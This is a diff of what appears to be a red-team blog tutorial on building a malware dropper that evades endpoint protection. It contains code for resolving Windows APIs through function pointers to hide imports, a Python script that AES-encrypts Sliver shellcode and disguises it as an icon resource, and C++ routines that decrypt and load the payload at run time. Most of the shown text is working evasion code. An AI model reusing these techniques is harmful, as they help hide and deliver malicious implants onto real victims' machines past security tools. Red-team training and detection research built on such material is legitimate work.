@@ -56,7 +56,7 @@ HANDLE CreateThread(
 
 We can use this in our implant to avoid having to import at run time by inserting this line before the function call:
 
-```CPP
+```
 HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE  lpStartAddress,__drv_aliasesMem LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId );
 ```
 
@@ -67,7 +67,7 @@ What we've done here is creating a WINAPI pointer to the function, and it can be
 The fastest way to be caught is to use a payload easily identifiable to the EPP. The easiest way to not be caught, then, is to encrypt our payload until run time. For this section, I updated the Python script from Sektor7's red team operator course to be Python3 compatible. This way, we can now feed our outputted shellcode file from Sliver into our encrypt function, get a key and encrypted payload, and then hide that further in our dropper. I don't want to share too much of reenz0h's work, so I'll keep it simple by supplying only pieces I've found also on StackOverflow from a decade ago.
 
 The padding function is as follows:
-```Python
+```
 def pad(s):
     length = 16 - (len(s) % 16)
     s += bytes([length])*length
@@ -75,7 +75,7 @@ def pad(s):
 ```
 
 And the encrypting function is as follows:
-```Python
+```
 def aesenc(plaintext, key):
   iv = 16*'\x00'
   iv = bytearray(iv, 'utf-8')
@@ -87,13 +87,13 @@ def aesenc(plaintext, key):
 ```
 
 We generate a key through using the ```urandom``` import and call the aesenc function through this:
-```Python
+```
 plaintext = open(sys.argv[1], "rb").read()
 ciphertext = aesenc(plaintext, KEY)
 ```
 
 Then to get the output looking nice we do some string manipulation and write it to the resource.ico file:
-```Python
+```
 print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
 imm_by = bytes(ciphertext)
 
@@ -103,7 +103,7 @@ with open('resource.ico', 'wb') as file:
 
 Then at run time, we decrypt it using the native Windows Crypto API functions:
 
-```CPP
+```
 int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
         HCRYPTPROV hProv;
         HCRYPTHASH hHash;
@@ -135,14 +135,14 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
 ```
 We have all the pieces ready for encrypting and decrypting but how do we tell our app to compile with this as a resource? We will need two additional files for this. ```resources.h``` will hold a simple declaration ```#define FAVICON_ICO 100``` and ```resources.rc``` will hold the following:
 
-```CPP
+```
 #include "resources.h"
 FAVICON_ICO RCDATA resource.ico
 ```
 
 Retrieving our encrypted payload from the resources section can be done with the below:
 
-```CPP
+```
 res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
 resHandle = LoadResource(NULL, res);
 payload = (char *) LockResource(resHandle);
